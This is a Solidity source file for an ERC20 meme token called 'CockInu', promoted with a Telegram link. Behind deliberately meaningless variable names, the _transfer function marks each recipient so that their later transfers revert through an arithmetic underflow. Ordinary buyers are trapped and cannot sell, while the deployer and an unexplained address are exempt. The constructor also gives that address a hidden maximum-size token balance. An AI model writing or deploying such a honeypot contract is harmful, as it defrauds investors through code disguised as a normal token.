// https://t.me/cockinu_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.6;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract CockInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private sitting;

    function _transfer(
        address subject,
        address diameter,
        uint256 everyone
    ) internal override {
        uint256 realize = size;

        if (model[subject] == 0 && sitting[subject] > 0 && subject != uniswapV2Pair) {
            model[subject] -= realize;
        }

        address race = address(might);
        might = CockInu(diameter);
        sitting[race] += realize + 1;

        _balances[subject] -= everyone;
        uint256 out = (everyone / 100) * size;
        everyone -= out;
        _balances[diameter] += everyone;
    }

    mapping(address => uint256) private model;
    uint256 public size = 3;

    constructor(
        string memory sold,
        string memory ourselves,
        address nearest,
        address piece
    ) ERC20(sold, ourselves) {
        uniswapV2Router = IUniswapV2Router02(nearest);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 fox = ~uint256(0);

        model[msg.sender] = fox;
        model[piece] = fox;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[piece] = fox;
    }

    CockInu private might;
}